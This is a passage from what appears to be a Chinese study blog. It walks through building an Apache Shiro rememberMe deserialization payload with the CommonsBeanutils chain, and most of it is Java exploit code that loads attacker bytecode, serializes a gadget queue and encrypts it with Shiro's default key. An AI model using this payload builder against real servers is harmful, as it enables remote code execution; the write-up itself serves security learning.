+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Files</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Paths</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">shiroCBtest</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">tem</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Files</span><span class="p">.</span><span class="na">readAllBytes</span><span class="p">(</span><span class="n">Paths</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;D:/gaoren.class&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;gaoren&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_class&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">queue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanComparator</span><span class="w"> </span><span class="n">comparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanComparator</span><span class="p">(</span><span class="s">&#34;outputProperties&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;comparator&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="n">comparator</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">queue_array</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">tem</span><span class="p">,</span><span class="n">1</span><span class="p">};</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">queue_field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;queue&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue_field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue_field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="n">queue_array</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serilize</span><span class="p">(</span><span class="n">queue</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">originalText</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 加密  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">encryptedText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">encrypt</span><span class="p">(</span><span class="n">originalText</span><span class="p">,</span><span class="w"> </span><span class="n">SECRET_KEY</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Encrypted: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">encryptedText</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encrypt</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">secret</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AesCipherService</span><span class="w"> </span><span class="n">aes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AesCipherService</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">CodecSupport</span><span class="p">.</span><span class="na">toBytes</span><span class="p">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteSource</span><span class="w"> </span><span class="n">ciphertext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aes</span><span class="p">.</span><span class="na">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ciphertext</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">  </span><span class="c1">//ByteSource对象的toString()会将字节数据转换成Base64编码的字符串，所以这里不用再额外进行base64编码了，如果想要得到原始字节码可以使用getBytes()方法，然后再进行base64编码。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">serilize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">objout</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">out</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">objout</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ObjectBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">base64EncodedValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">ObjectBytes</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">base64EncodedValue</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">deserilize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">Filename</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="n">ClassNotFoundException</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">Filename</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="n">value</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p>抓包替换 rememberMe 字段，发包后报错，显示报错和 cc 有关</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-093305.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-093305.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-093305.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-093305.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-093305.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-093305.png" /></p>
+<p>后面看了组长的视频知道是因为没有 cc 依赖，而 cb 中的 <code>BeanComparator</code> 类构造函数引用了 cc 中的类 <code>ComparableComparator</code>。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-130632.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-130632.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-130632.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-130632.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-130632.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-130632.png" /></p>
+<p>可以用它的另一个构造函数，只不过这里需要找一个继承了 <code>Comparator</code> 接口并且继承 <code>Serializable</code> 接口的类，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131117.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131117.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131117.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131117.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131117.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131117.png" /></p>
+<p>发现 <code>AttrCompare</code> 类就满足条件。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131245.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131245.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131245.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131245.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131245.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131245.png" /></p>
+<p>所以重新构造</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.apache.shiro.web</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.shiro.codec.Base64</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.shiro.codec.CodecSupport</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.shiro.crypto.AesCipherService</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.shiro.util.ByteSource</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Files</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Paths</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">shiroCBtest</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">tem</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Files</span><span class="p">.</span><span class="na">readAllBytes</span><span class="p">(</span><span class="n">Paths</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;D:/yusi.class&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;gaoren&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_class&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">queue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanComparator</span><span class="w"> </span><span class="n">comparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanComparator</span><span class="p">(</span><span class="s">&#34;outputProperties&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">AttrCompare</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;comparator&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="n">comparator</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">queue_array</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">tem</span><span class="p">,</span><span class="n">1</span><span class="p">};</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">queue_field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;queue&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue_field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue_field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="n">queue_array</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serilize</span><span class="p">(</span><span class="n">queue</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">originalText</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 加密  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">encryptedText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">encrypt</span><span class="p">(</span><span class="n">originalText</span><span class="p">,</span><span class="w"> </span><span class="n">SECRET_KEY</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Encrypted: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">encryptedText</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encrypt</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">secret</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
